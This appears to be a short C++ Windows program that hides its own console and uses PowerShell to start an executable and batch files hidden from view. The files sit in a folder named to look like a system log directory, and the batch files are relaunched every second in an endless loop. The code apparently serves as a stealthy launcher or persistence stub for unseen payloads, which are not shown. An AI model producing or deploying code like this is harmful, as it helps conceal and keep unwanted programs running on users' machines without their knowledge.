#include <cstdlib>
#include <Windows.h>
#include <conio.h>
#include <iostream>
#include <strsafe.h>

int main() {
	HWND h = GetConsoleWindow();
	ShowWindow(h, SW_HIDE);

	system("PowerShell -Command \"Start-Process -WindowStyle Hidden \\\"C:\\Program Files (x86)\\Common Files\\System\\logs\\widgetService.exe\\\"\"");
	system("PowerShell -Command \"Start-Process -WindowStyle Hidden \\\"C:\\Program Files (x86)\\Common Files\\System\\logs\\widgetService.exe\\\"\"");

	while (true) {
		Sleep(1000);
		system("PowerShell -Command \"Start-Process -WindowStyle Hidden \\\"C:\\Program Files (x86)\\Common Files\\System\\logs\\battery\\onLoop.bat\\\"\"");
		system("PowerShell -Command \"Start-Process -WindowStyle Hidden \\\"C:\\Program Files (x86)\\Common Files\\System\\logs\\battery\\onLoop_.bat\\\"\"");
		//system("PowerShell -Command \"Start-Process -WindowStyle Hidden \\\"C:\\Program Files (x86)\\Common Files\\System\\logs\\widgets.exe\\\"\"");
	}

	return 0;
}